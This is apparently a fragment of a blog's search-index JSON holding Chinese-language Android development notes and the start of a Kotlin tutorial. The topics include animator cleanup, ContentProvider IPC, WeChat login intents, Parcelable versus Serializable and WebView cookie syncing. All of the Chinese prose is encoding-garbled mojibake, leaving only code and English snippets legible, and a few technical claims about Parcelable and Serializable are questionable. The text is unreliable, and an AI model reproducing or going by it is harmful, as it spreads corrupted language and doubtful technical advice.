29.Androidçš„åŠ¨ç”»åˆ†ä¸ºAnimationå’ŒAnimatorå®ç°android åŠ¨ç”»åŸç†.ObjectAnimatorå’ŒValueAnimatorè¿™äº›ä¸œè¥¿è¦è®°å¾—åœ¨é¡µé¢é”€æ¯çš„æ—¶å€™å»cancelæˆ–è€…endã€‚endä¼šé€šçŸ¥ä¸€å£°onAnimationUpdateï¼Œcancelä¸ä¼šã€‚æ‰€ä»¥ä¸è¦åœ¨onAnimationUpdateé‡Œé¢è°ƒç”¨end -&gt; onAnimationUpdateé‡Œé¢è°ƒç”¨end -&gt; onAnimationUpdateé‡Œé¢è°ƒç”¨end -&gt; onAâ€¦. Fatal Exception: java.lang.StackOverflowErrorat android.animation.ValueAnimator.getOrCreateAnimationHandler(ValueAnimator.java:1332) 30. åœ¨api24ä¹‹å‰ï¼ŒWifiManagerå­˜åœ¨leak On versions prior to Android N (24), initializing the WifiManager via Context#getSystemService can cause a memory leak if the context is not the application context 31. Androidæ‰‹æœºæ˜¾ç¤ºçš„ç”µé‡æ˜¯ä»å“ªè¯»å–çš„ï¼Ÿbatterystats.binä¸æ˜¯ç”¨æ¥åšç”µæ± æ ¡æ­£çš„ã€‚2012å¹´1æœˆ13æ—¥ï¼ŒDianneHackbornåœ¨G+ä¸Šç»™å‡ºäº†ç­”æ¡ˆï¼š Today&#39;s myth debunking: &quot;The battery indicator in the status/notification bar is a reflection of the batterystats.bin file in the data/system/ directory.&quot; No, it does not. è¿™ä¸ªæ–‡ä»¶åªæ˜¯ç”¨æ¥æ˜¾ç¤ºâ€œè®¾ç½®â€é‡Œé¢Appè€—ç”µé‡çš„,across rebootã€‚æ·±å…¥æµ…å‡ºAndroid Appè€—ç”µé‡ç»Ÿè®¡è¿™ç¯‡æ–‡ç« æŒ‡å‡ºï¼Œå®é™…è¯»å–çš„æ–‡ä»¶ä½ç½®ç”±OEMå‚å•†å†³å®šï¼Œå®˜æ–¹æ–‡æ¡£ device///frameworks/base/core/res/res/xml/power_profile.xml è¿™ä¸ªæ–‡ä»¶ å…¶å®è¿™ä¸€æ®µadbå‘½ä»¤å°±å¯ä»¥äº† adb shell dumpsys batterystats 32. å¤šè¿›ç¨‹SharedPreferenceè¯»å†™ä½¿ç”¨ContentProviderå°±å¥½äº†public abstract SharedPreferences getSharedPreferences(String name, @PreferencesMode int mode); //é»˜è®¤ä¼ è¿›æ¥çš„æ˜¯MODE_PRIVATEï¼Œ // MODE_MULTI_PROCESS å…¶å®ä¸èƒ½ä¿è¯ æ‰€ä»¥ä¸€èˆ¬çš„åšæ³•æ˜¯åˆ©ç”¨ContentProviderå»IPCã€‚ getContentResolver().getType() //å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ providerçš„getTypeæ–¹æ³•ä¸­è¿”å›å¯¹åº”çš„Stringï¼Œä¸€æ¬¡IPCæ¥å› æ‰“æ–­ç‚¹å‘ç°providerè¿›ç¨‹ä¼šèµ°åˆ°execTransact -&gt; onTransact -&gt; queryæ–¹æ³•ã€‚è¿™æœŸé—´clientè¢«æŒ‚èµ·ï¼Œè¿œç¨‹æ–¹æ³•è¿”å›ä¹‹åclientæ–¹æ³•ç»§ç»­æ‰§è¡Œã€‚å®¢æˆ·ç«¯å‘é€è¯·æ±‚åï¼Œä¼šè¢«æŒ‚èµ·ï¼Œæ‰€ä»¥å¦‚æœé•¿æ—¶é—´ä¸è¿”å›ï¼Œå½“å‰çº¿ç¨‹ä¼šä¸€ç›´é˜»å¡ï¼Œæ‰€ä»¥è¦åœ¨å­çº¿ç¨‹å‘é€å¼‚æ­¥è¯·æ±‚ã€‚å†™contentProviderçš„å¥—è·¯åŸºæœ¬å°±æ˜¯ public static final String AUTHORITY = &quot;com.me.book.provider&quot;; // ä¸AndroidManifestä¿æŒä¸€è‡´ public static final Uri BOOK_CONTENT_URI = Uri.parse(&quot;content://&quot; + AUTHORITY + &quot;/book&quot;); public static final Uri USER_CONTENT_URI = Uri.parse(&quot;content://&quot; + AUTHORITY + &quot;/user&quot;); æ•°æ®åº“çš„ä½ç½®æ˜¯æ”¾åœ¨/data/data/com.packagename.applicationName/databasesé‡Œ/data/data/com.packagename.applicationName/è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œä¸€å…±å››ä¸ªæ–‡ä»¶å¤¹ï¼Œcache, code_cache(dex), files,databases å¥½åƒ7.0ä¹‹åsharedPreferenceçš„å­˜å‚¨çš„ä½ç½®æŒªåˆ°äº†â€œ/data/data/åº”ç”¨ç¨‹åºåŒ…/shared_prefsâ€è¿™é‡Œ MultiProcessSharedPreferencesåœ¨æ­¤ 33. Activityçš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„è¯é¢˜A start B forResult , Bå›æ¥ä¹‹åAè¢«ç³»ç»Ÿå¹²æ‰äº†æ€ä¹ˆåŠï¼Ÿå›æ¥çš„æ—¶å€™Aå·²ç»ä¸æ˜¯åŸæ¥çš„Aï¼Œæ‰€ä»¥è¦åœ¨onSaveInstanceå’ŒonRestoreInstanceä¸­ç»´æŠ¤æ•°æ® 34. é›†æˆå¾®ä¿¡ç™»å½•ï¼Œå¾®ä¿¡å¦‚ä½•å’ŒAppé€šä¿¡çš„ï¼ŸWXEntryActivityä¸€èˆ¬æ˜¯è¿™æ ·çš„: public class WXEntryActivity extends Activity implements IWXAPIEventHandler { private IWXAPI api; @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); api = WXAPIFactory.createWXAPI(this, mWXAppKey); api.handleIntent(getIntent(), this); } @Override public void onResp(BaseResp resp) { switch (resp.errCode) { case BaseResp.ErrCode.ERR_OK: break; } } } // api.handleIntent(getIntent(), this); è¿™é‡Œé¢çš„å®ç°å¦‚ä¸‹ï¼š public final boolean handleIntent(Intent var1, IWXAPIEventHandler var2) { try { int var16 = var1.getIntExtra(&quot;_wxapi_command_type&quot;, 0); //è¿™é‡Œå…¶å®å·²ç»è·‘åœ¨å½“å‰Appçš„è¿›ç¨‹äº† switch(var16) { case 1: Resp var23 = new Resp(var1.getExtras()); var2.onResp(var23); // ç›´æ¥è°ƒç”¨WXEntryActivityä¸­çš„onRespæ–¹æ³• return true; case 2: com.tencent.mm.opensdk.modelmsg.SendMessageToWX.Resp var22 = new com.tencent.mm.opensdk.modelmsg.SendMessageToWX.Resp(var1.getExtras()); var2.onResp(var22); return true; // ...... } } } å†ç»“åˆxmlä¸­çš„exported = true ; &lt;activity android:name=&quot;.wxapi.WXEntryActivity&quot; android:exported=&quot;true&quot; android:launchMode=&quot;singleTop&quot; android:theme=&quot;@android:style/Theme.Translucent&quot; /&gt; çŒœæµ‹æ˜¯é€šè¿‡Intentç›´æ¥è®¾ç½®componentå‘é€è¯·æ±‚ï¼Œä¼ é€’æ•°æ®ï¼Œå¾ˆæ­£è§„çš„å®ç° 35. å¤šè¿›ç¨‹è™šæ‹Ÿæœºéƒ½æ˜¯å•ç‹¬çš„Androidä¸ºæ¯ä¸ªåº”ç”¨éƒ½åˆ†é…äº†ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿæœº(VM)ï¼Œç¡®åˆ‡è¯´æ˜¯ä¸ºæ¯ä¸ªè¿›ç¨‹éƒ½åˆ†é…äº†ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿæœºï¼Œä¸åŒçš„è™šæ‹Ÿæœºåœ¨å†…å­˜åˆ†é…ä¸Šæœ‰ä¸åŒçš„åœ°å€ç©ºé—´ï¼Œè¿™æ ·åœ¨ä¸åŒçš„è™šæ‹Ÿæœº(å³è¿›ç¨‹)ä¸­è®¿é—®åŒä¸€ä¸ªç±»çš„å¯¹è±¡æ—¶å°±ä¼šäº§ç”Ÿå¤šä»½å‰¯æœ¬ï¼Œè€Œè¿™äº›å‰¯æœ¬ä¹‹é—´ä¹Ÿæ˜¯ç›¸äº’ç‹¬ç«‹ï¼Œäº’ä¸å½±å“çš„ã€‚ 36. Parcelable ä¸ Serializable åŒºåˆ«Serializableçš„è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†åºåˆ—åŒ–å¯¹è±¡åˆ°æœ¬åœ°æ–‡ä»¶ã€æ•°æ®åº“ã€ç½‘ç»œæµã€RMIä»¥ä¾¿æ•°æ®ä¼ è¾“ï¼Œå½“ç„¶è¿™ç§ä¼ è¾“å¯ä»¥æ˜¯ç¨‹åºå†…çš„ä¹Ÿå¯ä»¥æ˜¯ä¸¤ä¸ªç¨‹åºé—´çš„ã€‚è€ŒAndroidçš„Parcelableçš„è®¾è®¡åˆè¡·æ˜¯ç”±äºSerializableæ•ˆç‡è¿‡ä½ï¼Œæ¶ˆè€—å¤§ï¼Œè€Œandroidä¸­æ•°æ®ä¼ é€’ä¸»è¦æ˜¯åœ¨å†…å­˜ç¯å¢ƒä¸­ï¼ˆå†…å­˜å±äºandroidä¸­çš„ç¨€æœ‰èµ„æºï¼‰ï¼Œå› æ­¤Parcelableçš„å‡ºç°ä¸ºäº†æ»¡è¶³æ•°æ®åœ¨å†…å­˜ä¸­ä½å¼€é”€è€Œä¸”é«˜æ•ˆåœ°ä¼ é€’é—®é¢˜ã€‚Parcelableçš„æ€§èƒ½æ¯”Serializableå¥½ï¼Œåœ¨å†…å­˜å¼€é”€æ–¹é¢è¾ƒå°ï¼Œæ‰€ä»¥Androidåº”ç”¨ç¨‹åºåœ¨å†…å­˜é—´æ•°æ®ä¼ è¾“æ—¶æ¨èä½¿ç”¨Parcelableï¼Œå¦‚activityé—´ä¼ è¾“æ•°æ®å’ŒAIDLæ•°æ®ä¼ é€’ï¼Œè€ŒSerializableå°†æ•°æ®æŒä¹…åŒ–çš„æ“ä½œæ–¹ä¾¿ï¼Œå› æ­¤åœ¨å°†å¯¹è±¡åºåˆ—åŒ–åˆ°å­˜å‚¨è®¾ç½®ä¸­æˆ–å°†å¯¹è±¡åºåˆ—åŒ–åé€šè¿‡ç½‘ç»œä¼ è¾“æ—¶å»ºè®®é€‰æ‹©Serializableï¼ˆParcelableä¹Ÿæ˜¯å¯ä»¥ï¼Œåªä¸è¿‡å®ç°å’Œæ“ä½œè¿‡ç¨‹è¿‡äºéº»çƒ¦å¹¶ä¸”ä¸ºäº†é˜²æ­¢androidç‰ˆæœ¬ä¸åŒè€Œå¯¼è‡´Parcelableå¯èƒ½ä¸åŒçš„æƒ…å†µï¼Œå› æ­¤åœ¨åºåˆ—åŒ–åˆ°å­˜å‚¨è®¾å¤‡æˆ–è€…ç½‘ç»œä¼ è¾“æ–¹é¢è¿˜æ˜¯å°½é‡é€‰æ‹©Serializableæ¥å£ï¼‰ã€‚ æ— è®ºæ˜¯Parcelableè¿˜æ˜¯Serializableï¼Œæ‰§è¡Œååºåˆ—æ“ä½œåçš„å¯¹è±¡éƒ½æ˜¯æ–°åˆ›å»ºçš„ï¼Œä¸åŸæ¥çš„å¯¹è±¡å¹¶ä¸ç›¸åŒï¼Œåªä¸è¿‡å†…å®¹ä¸€æ ·ç½¢äº†ã€‚è¯¦ç»†ä»‹ç»Androidä¸­Parcelableçš„åŸç†å’Œä½¿ç”¨æ–¹æ³•ParcelableåŸºæœ¬ä¸Šæ˜¯å°†å¯¹è±¡æ˜ å°„æˆä¸€ä¸ªParcelå¯¹è±¡ï¼Œæä¾›äº†ä¸¤è€…ä¹‹é—´è½¬æ¢çš„å‡½æ•°ï¼ŒParcelå¯¹è±¡å¯ä»¥è¢«å†™è¿›å…±äº«å†…å­˜ã€‚è·¨è¿›ç¨‹ç›´æ¥ä½¿ç”¨ã€‚Serializableåœ¨æ¢å¤ä¸€ä¸ªObjectçš„æ—¶å€™æ˜¯å»ä½¿ç”¨ObjecInputStreamçš„readObjectæ–¹æ³•ï¼Œè¿™é‡Œé¢è°ƒç”¨äº†newInstanceæ–¹æ³•ï¼Œåå°„ï¼Œæ€§èƒ½å½“ç„¶ä¼šå·®ä¸€ç‚¹ã€‚ 3.Parcelableä¸Serializableçš„æ€§èƒ½æ¯”è¾ƒé¦–å…ˆParcelableçš„æ€§èƒ½è¦å¼ºäºSerializableçš„åŸå› æˆ‘éœ€è¦ç®€å•çš„é˜è¿°ä¸€ä¸‹ 1ï¼‰. åœ¨å†…å­˜çš„ä½¿ç”¨ä¸­,å‰è€…åœ¨æ€§èƒ½æ–¹é¢è¦å¼ºäºåè€… 2ï¼‰. åè€…åœ¨åºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ä¼šäº§ç”Ÿå¤§é‡çš„ä¸´æ—¶å˜é‡,(åŸå› æ˜¯ä½¿ç”¨äº†åå°„æœºåˆ¶)ä»è€Œå¯¼è‡´GCçš„é¢‘ç¹è°ƒç”¨,å› æ­¤åœ¨æ€§èƒ½ä¸Šä¼šç¨å¾®é€Šè‰² 3ï¼‰. Parcelableæ˜¯ä»¥Ibinderä½œä¸ºä¿¡æ¯è½½ä½“çš„.åœ¨å†…å­˜ä¸Šçš„å¼€é”€æ¯”è¾ƒå°,å› æ­¤åœ¨å†…å­˜ä¹‹é—´è¿›è¡Œæ•°æ®ä¼ é€’çš„æ—¶å€™,Androidæ¨èä½¿ç”¨Parcelable,æ—¢ç„¶æ˜¯å†…å­˜æ–¹é¢æ¯”ä»·æœ‰ä¼˜åŠ¿,é‚£ä¹ˆè‡ªç„¶å°±è¦ä¼˜å…ˆé€‰æ‹©. 4ï¼‰. åœ¨è¯»å†™æ•°æ®çš„æ—¶å€™,Parcelableæ˜¯åœ¨å†…å­˜ä¸­ç›´æ¥è¿›è¡Œè¯»å†™,è€ŒSerializableæ˜¯é€šè¿‡ä½¿ç”¨IOæµçš„å½¢å¼å°†æ•°æ®è¯»å†™å…¥åœ¨ç¡¬ç›˜ä¸Š. ä½†æ˜¯ï¼šè™½ç„¶Parcelableçš„æ€§èƒ½è¦å¼ºäºSerializable,ä½†æ˜¯ä»ç„¶æœ‰ç‰¹æ®Šçš„æƒ…å†µéœ€è¦ä½¿ç”¨Serializable,è€Œä¸å»ä½¿ç”¨Parcelable,å› ä¸ºParcelableæ— æ³•å°†æ•°æ®è¿›è¡ŒæŒä¹…åŒ–,å› æ­¤åœ¨å°†æ•°æ®ä¿å­˜åœ¨ç£ç›˜çš„æ—¶å€™,ä»ç„¶éœ€è¦ä½¿ç”¨åè€…,å› ä¸ºå‰è€…æ— æ³•å¾ˆå¥½çš„å°†æ•°æ®è¿›è¡ŒæŒä¹…åŒ–.(åŸå› æ˜¯åœ¨ä¸åŒçš„Androidç‰ˆæœ¬å½“ä¸­,Parcelableå¯èƒ½ä¼šä¸åŒ,å› æ­¤æ•°æ®çš„æŒä¹…åŒ–æ–¹é¢ä»ç„¶æ˜¯ä½¿ç”¨Serializable) 37.WebViewçš„statusCodeçš„è·å–æ¥è‡ªstackoverFlow @TargetApi(Build.VERSION_CODES.M) @Override public void onReceivedError(WebView view, WebResourceRequest req, WebResourceError rerr) { onReceivedError(view, rerr.getErrorCode(), rerr.getDescription().toString(), req.getUrl().toString()); } @SuppressWarnings(&quot;deprecation&quot;) public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) { if (errorCode == -14) // -14 is error for file not found, like 404. view.loadUrl(&quot;http://youriphost&quot;); } 38 .WebViewçš„Cookieé—®é¢˜List&lt;Cookie&gt; mCookies; mOkHttpClient = new OkHttpClient.Builder() ... // ä¸‹é¢å°±æ˜¯å¯¹OkHttpçš„cookieçš„å¤„ç† .cookieJar(new CookieJar() { // å¯¹æœåŠ¡å™¨è¿”å›çš„cookieçš„å¤„ç†çš„æ–¹æ³• // å‚æ•°urlå’Œcookieå°±æ˜¯cookieå¯¹åº”çš„urlå’Œcookieçš„å€¼ @Override public void saveFromResponse(HttpUrl url, List&lt;Cookie&gt; cookies) { // å¯¹cookieçš„å¤„ç†ï¼Œä¸€èˆ¬æ˜¯å­˜åˆ°å†…å­˜ä¸­ï¼Œä½¿å…¶ä»–åœ°æ–¹å¯ä»¥è·å¾— mCookies = cookies; } // å‘é€è¯·æ±‚æ—¶çš„cookieçš„å¤„ç†ï¼Œè¿”å›çš„List&lt;Cookie&gt;å³è¯·æ±‚çš„cookie @Override public List&lt;Cookie&gt; loadForRequest(HttpUrl url) { return mCookies; //return null; } }) .build(); //ä»okHttpé‚£è¾¹æ‹¿åˆ°cookieä¹‹å private void syncCookies(String url, List&lt;Cookie&gt; cookies) { // ä¸€äº›å‰æè®¾ç½® CookieSyncManager.createInstance(this); final CookieManager cookieManager = CookieManager.getInstance(); cookieManager.setAcceptCookie(true); /** * è®¾ç½®webViewæ”¯æŒJSçš„Cookieçš„è°ƒç”¨ï¼Œ5.0ä»¥ä¸Šæ‰è¦è®¾ç½® */ if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) { cookieManager.setAcceptThirdPartyCookies(mWebView, true); } //cookieManager.removeAllCookie(); // å‘WebViewä¸­æ·»åŠ Cookieï¼Œ for (Cookie cookie : cookies) { cookieManager.setCookie(url, cookie.toString()); } // åˆ·æ–°ï¼ŒåŒæ­¥ if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP_MR1) { CookieManager.getInstance().flush(); } CookieSyncManager.getInstance().sync(); //String newCookie = cookieManager.getCookie(url);éªŒè¯æ˜¯å¦å°†cookieåŒæ­¥è¿›å» //KLog.i(&quot;newCookie: &quot; + newCookie); } //ä½†æ˜¯é¡ºåºå¾ˆé‡è¦ // 1.å…ˆåˆå§‹åŒ–WebViewï¼Œå„ç§è®¾ç½®settingï¼ŒwebViewClientå’ŒchromeClientç­‰ initWebView(); // 2.å†è·å¾—ï¼Œå¹¶åŒæ­¥cookie // MyCookieJar.getInstance().getCookies()å¯ä»¥æ¢æˆApiManager.getInstance().getCookies()ç­‰ syncCookies(url, MyCookieJar.getInstance().getCookies()); // 3.æœ€ååŠ è½½url mWebView.loadUrl(url); cookieå¸¦ä¸è¿‡å»çš„è§£å†³é—®é¢˜ï¼šNativeå·²ç»ç™»å½•ï¼Œcookieå¯ä»¥è®¾ç½®è¿›å»ï¼Œä½†æ˜¯ç½‘é¡µè¿›è¡Œäº†å¤æ‚çš„ajaxæ“ä½œï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä»€ä¹ˆæ“ä½œï¼‰ï¼Œcookieå¸¦ä¸è¿‡å»ï¼Œåˆ°æŒ‡å®šé¡µé¢è¿˜å¾—ç™»å½•ã€‚5.0ä»¥ä¸‹æ­£å¸¸è§£å†³ï¼šç»è¿‡æ’æŸ¥ï¼Œå‘ç°é«˜ç‰ˆæœ¬æ—¶é—®é¢˜å‡ºåœ¨ajaxè·³è½¬æ—¶ï¼Œæ˜¯Jså¯¹Cookieçš„æ“ä½œï¼Œä¸ç»è¿‡WebViewï¼Œæ­£å¸¸çš„WebViewè®¾ç½®æ²¡æœ‰ä½œç”¨ã€‚çœ‹äº†å¾ˆå¤šåšå®¢ï¼Œè¿˜æ˜¯åœ¨StackOverFlowä¸Šå‘ç°è§£å†³æ–¹æ³•ã€‚ä¸€è¡Œä»£ç  final CookieManager cookieManager = CookieManager.getInstance(); cookieManager.setAcceptCookie(true); /** * è®¾ç½®webViewæ”¯æŒJSçš„Cookieçš„è°ƒç”¨ï¼Œ5.0ä»¥ä¸Šæ‰è¦è®¾ç½® */ // å¤§è‡´æ„æ€ï¼šmWebViewæ¥æ”¶ç¬¬ä¸‰æ–¹å¯¹Cookieçš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯æ”¯æŒJså¯¹cookieçš„æ“ä½œ cookieManager.setAcceptThirdPartyCookies(mWebView, true);","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"ä½¿ç”¨Kotlinè¿›è¡Œjavaå¼€å‘","date":"2017-01-13T23:06:13.000Z","path":"2017/01/13/2017-01-13-embracing-kotlin/","text":"Kotlinæ˜¯Jetbrainå…¬å¸æ¨å‡ºçš„é¢å‘jvmçš„è¯­è¨€ï¼Œç¼–è¯‘åçš„bytecodeå’Œjavaç¼–å†™çš„ä»£ç å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ 1. åŸºæœ¬è¯­æ³• æ²¡æœ‰newå…³é”®å­— ä¸»å‡½æ•° fun main(args : Array&lt;String&gt;) { for (i in args.indices) { print(args[i]) } } è‡ªå®šä¹‰å‡½æ•° fun getStringLength(obj: Any) :Int?{ //é—®å·ä»£è¡¨æœ‰å¯èƒ½è¿”å›ç©ºå€¼ if (obj is String) { return obj.length } return 0 } æ”¯æŒlambda fun maps(list: List&lt;String&gt;) { list.filter { it.startsWith(&quot;a&quot;) } .sortedBy { it } .map(String::toUpperCase) .forEach(::print) } å¯¹äºå‡½æ•°æœ‰æ–°çš„è®¤è¯†äº† public fun isOdd(number: Int) = number % 2 != 0 // å‡½æ•°ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªç­‰å¼æ¥è¡¨è¾¾äº† public fun isOdd2(number: Int) :Boolean { //è¿™ç§å°±å•°å—¦ç‚¹ return number % 2 != 0 } 2. é›†åˆç›¸å…³å¸¸ç”¨çš„è¿­ä»£ä¸€ä¸ªrangeçš„æ–¹å¼ for (i in 1..3) { println(i) //è¿™ä¸ªæ‰“å°å‡ºæ¥æ˜¯1ï¼Œ2ï¼Œ3 } for (i in 6 downTo 0 step 2) { println(i) } //è¿™ä¸ªæ‰“å°å‡ºæ¥æ˜¯6 4 2 0 //å¸¦indexçš„è¿­ä»£ä¸€ä¸ªé›†åˆçš„æ–¹å¼ val quoteParts = &quot; YOU JUST TALKED TO MUCH !&quot;.split(&quot; &quot;) for ((index, value) in quoteParts.withIndex()) { print(&quot;reading index $index: $value &quot;) } //å’Œjavaå®šä¹‰çš„List interfaceä¸ä¸€æ ·ï¼ŒKotlinå®šä¹‰çš„interfaceé»˜è®¤æ˜¯æ²¡æœ‰add,removeè¿™äº›ä¿®æ”¹æ€§è´¨çš„æ–¹æ³•çš„ã€‚ // æ¯”å¦‚è¯´æœ‰ä¸€ä¸ªintï¼Œæƒ³å‡‘åˆ°String + intä¸­ï¼Œä¸éœ€è¦String.formatäº†ï¼Œkotlinç»™StringåŠ ä¸Šäº†ä¸€ä¸ªformatçš„ententsion Functionï¼Œæ›´ç®€å•çš„æ–¹å¼æ˜¯ç›´æ¥åŠ ä¸Šç¾å…ƒç¬¦å·å¼•ç”¨å³å¯ã€‚æ„Ÿè§‰å’Œes6å¾ˆåƒã€‚ // List&lt;out T&gt;è¿™ç§é›†åˆé»˜è®¤åªæä¾›äº†åªè¯»çš„æ–¹æ³•ï¼Œæ¯”å¦‚get ,sizeã€‚æƒ³è¦æ›´æ”¹å†…å®¹éœ€è¦ä½¿ç”¨MutableListæ¥å£æä¾›çš„æ–¹æ³• // ç›´æ¥çœ‹ä»£ç çš„è¯ï¼Œä¸€ä¸ªæä¾›äº†readOnlyMethodï¼Œä¿®æ”¹(add ,remove ,set ...)çš„æ–¹æ³•æ˜¯é€šè¿‡MutableListæä¾›çš„ val numbers: MutableList&lt;Int&gt; = mutableListOf(1, 2, 3) val readOnlyView: List&lt;Int&gt; = numbers //å°†åŸå…ˆä¸€ä¸ªå¯ä¿®æ”¹çš„ListåŒ…è£…æˆä¸€ä¸ªâ€œåªè¯»â€çš„List println(numbers) // prints &quot;[1, 2, 3]&quot; numbers.add(4) println(readOnlyView) // prints &quot;[1, 2, 3, 4]&quot; ä½†æ˜¯ä¸å®Œå…¨åªè¯»ï¼Œé€šè¿‡ä¿®æ”¹åº•å±‚listè¿˜æ˜¯èƒ½åªè¯» readOnlyView.clear() // -&gt; does not compile val items = listOf(1, 2, 3) //å½»åº•çš„åªè¯» public interface MutableList&lt;E&gt; : List&lt;E&gt;, MutableCollection&lt;E&gt; { override fun clear(): Unit public fun add(index: Int, element: E): Unit } è¯»å–ä¸€ä¸ªListçš„å…ƒç´ æ¨èä½¿ç”¨æ•°ç»„ä¸‹æ ‡ items.get(0) //ideä¼šæç¤ºæ¨èä½¿ç”¨ä¸‹é¢è¿™ç§æ–¹å¼ items[0] // mapä¹Ÿæ˜¯ï¼Œæ¨èé€šè¿‡ç±»ä¼¼äºæ•°ç»„ä¸‹æ ‡çš„æ–¹å¼å»è·å–value 3. implementing an interface not like in javaå¦‚æœæ¥å£åªæœ‰ä¸€ä¸ªæ–¹æ³•ç®€å•ç”¨lambda button.setOnClickListener( { v-&gt; System.out.print(v.id)}) å¦‚æœæœ‰å¤šä¸ªæ–¹æ³•ï¼Œè¯­æ³•å°±æ˜¾å¾—å•°å—¦çš„å¤š val handler = object : DisposableObserver&lt;Bitmap&gt;() { override fun onError(e: Throwable) { LogUtil.d(&quot;e&quot;) } override fun onNext(t: Bitmap) { image_two!!.setImageBitmap(t) } override fun onComplete() { LogUtil.d(&quot;completed&quot;) } } æåˆ°lambdaï¼Œå¯ä»¥è®¤ä¸ºå°±æ˜¯ä¸€ä¸ªè¦æ‰§è¡Œçš„è§„åˆ™ fun logExecution1(func: () -&gt; String){ Log.d(&quot;tag&quot;,&quot;before method call&quot;) func() Log.d(&quot;tag&quot;,&quot;after method call&quot;) } logExecution1({ val result = &quot;name&quot; result }) åœ¨high order functionçš„é¢†åŸŸé‡Œï¼Œè¿™å°±ç®—ä¼ å…¥äº†ä¸€ä¸ªè¿”å›å€¼ä¸ºStringçš„å‡½æ•°ï¼Œç”¨lambdaçš„è¯ï¼Œè¿”å›å€¼å°±ä¸ç”¨å†™returnäº†ã€‚å¥½åƒä½¿ç”¨é«˜é˜¶å‡½æ•°ï¼Œåªèƒ½è¿™ä¹ˆå†™lambda.lambdaçš„å‡½æ•°çš„å†™æ³•ç›¸å½“é‚ªä¹ï¼Œç”¨ä¸¤ä¸ªåˆ†å·åŒ…èµ·æ¥ï¼Œé‡Œé¢ä¸€è¡Œè¡Œçš„å†™ï¼Œæœ€åä¹Ÿä¸ç”¨å†™è¿”å›å€¼ 4. æ²¡æœ‰newå…³é”®å­—äº†class somClass{ fun printMsg(msg : String){ println(msg) } } fun main(args: Array&lt;String&gt;){ val instance = somClass() // ç›´æ¥æŠŠnewç»™åˆ äº† instance.printMsg(&quot;Hey there&quot;) } 5. java Beanä¸éœ€è¦å†™åºŸè¯äº†data class SomeThing(val id: Int) //ç”¨çš„æ—¶å€™ val instance = SomeThing(10) //è¿™ç§data classä¼šä¸»åŠ¨å¯¹å¤–æä¾›éprivateå±æ€§(éƒ½ä¸èƒ½å«Fieldäº†)çš„è®¿é—®æƒï¼ˆç±»ä¼¼get setï¼‰ã€‚æœ‰äº›getæ–¹æ³•ä¼šåˆ»æ„å¤å†™getter private val foo = calcValue(&quot;foo&quot;) //è¿™ä¸ªåªä¼šåœ¨ç¬¬ä¸€æ¬¡è®¿é—®å±æ€§çš„æ—¶å€™è°ƒç”¨è¿™ä¸ªæ–¹æ³• private val bar get() = calcValue(&quot;bar&quot;) //ä¸»åŠ¨æ·»åŠ çš„getæ–¹æ³•ï¼Œæ„å‘³ç€æ¯æ¬¡è°ƒç”¨å±æ€§éƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³• private fun calcValue(name: String): Int { println(&quot;Calculating $name&quot;) return 3 } // è‡ªå®šä¹‰getterå’Œsetter var stringRepresentation: String get() = this.toString() set(value) { setDataFromString(value) // parses the string and assigns values to other properties } å¯¹äºä¸å¸Œæœ›ç”Ÿæˆgetterå’Œsetterçš„filedï¼Œä½¿ç”¨@jvmFiledçš„æ³¨è§£æ ‡è¯†å³å¯ 6. å…·æœ‰æ›´å¥½è¯­ä¹‰çš„typealistypealias CustomerName = String data class Customer(val name: CustomerName,val email: String) è·Ÿlinuxä¸Šçš„aliaså·®ä¸å¤šï¼ŒCustomerNameå…¶å®å°±æ˜¯Stringï¼Œä½†ä½¿ç”¨typealiasä½¿å¾—ä¼ æ•°æ®æ—¶æ›´ä¸å®¹æ˜“é”™è¯¯ã€‚ 7. switch caseç”¨whenæ¥å†™fun returnSomeThing(input :Any) : String{ val actual = when(input){ 1 -&gt; { println(&quot;1&quot;) } 2 -&gt; { println(&quot;2&quot;) } is Int -&gt; { println(&quot;is Int&quot;) } else -&gt;{ println(&quot;don&#39;t know which one&quot;) } } return actual.toString() } // when ... is ...æ˜¯æ ¹æ®ä¼ å…¥çš„objectçš„classç±»å‹æ¥è¿›è¡Œåˆ¤æ–­çš„ when (x) { is Foo -&gt; ... is Bar -&gt; ... else -&gt; ... } 8. èƒ½å¤Ÿæ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°åœ¨è°ƒç”¨ä¸€äº›èµ„æºçš„æ—¶å€™ï¼Œç»å¸¸éœ€è¦ç”¨å®Œäº†å…³é—­æ‰ fun using(resource: Closeable, body: () -&gt; Unit) { try { body() }finally { resource.close() } } val inputstram = FileInputStream(&quot;/&quot;) as FileInputStream using(inputstram){ // do stuff with this resource // it will close for you } 9. è·å–thisä½¿ç”¨this@MyActivityå³å¯ 10. findViewByIdæ€ä¹ˆå†™ changeval listView = findViewById(R.id.list) as ListView toval listView = findViewById(R.id.list) å‚è€ƒ å°è£…ï¼š fun &lt;V : View&gt; Activity.bindView(id: Int): Lazy&lt;V&gt; = lazy { viewFinder(id) as V } private val Activity.viewFinder: Activity.(Int) -&gt; View? get() = { findViewById(it) } ä¹‹åæˆ‘ä»¬å°±å¯ä»¥åœ¨ Activity ä¸­è¿™æ ·æ³¨å…¥ View äº† val mTextView by bindView&lt;TextView&gt;(R.id.text_view) 11.extendséœ€è¦æŠŠparentClassè®¾ç½®ä¸ºopenopen class MySuperClass(parameter:String) class MyClass2 { object AnonymousSubClass:MySuperClass(&quot;something&quot;),MyInterface1,MyInterface2 { } } 12.æ²¡æœ‰static 